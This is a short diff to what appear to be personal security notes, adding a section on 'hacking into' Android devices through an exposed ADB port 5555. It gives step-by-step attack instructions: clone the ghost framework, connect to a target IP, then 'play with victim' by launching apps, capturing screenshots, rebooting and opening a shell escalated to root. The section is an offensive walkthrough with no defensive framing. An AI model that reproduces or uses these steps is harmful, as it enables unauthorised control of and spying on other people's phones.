@@ -62,3 +62,18 @@
 destination_:
 
     ![](images/wireshar_example.png)
+
+---
+
+## Hacking into Android device using port 5555 (ADB)
+
+1. Clone repo https://github.com/EntySec/ghost
+2. Install ghost and run it
+3. `connect IP_TARGET`
+4. Play with victim e.g.:
+  - run some apps: `launch com.android.calculator2`
+  - take a device screenshot: `screenshot`
+  - reboot device: `reboot`
+  - run shell: `shell` -> `su` to get root privilege
+
+
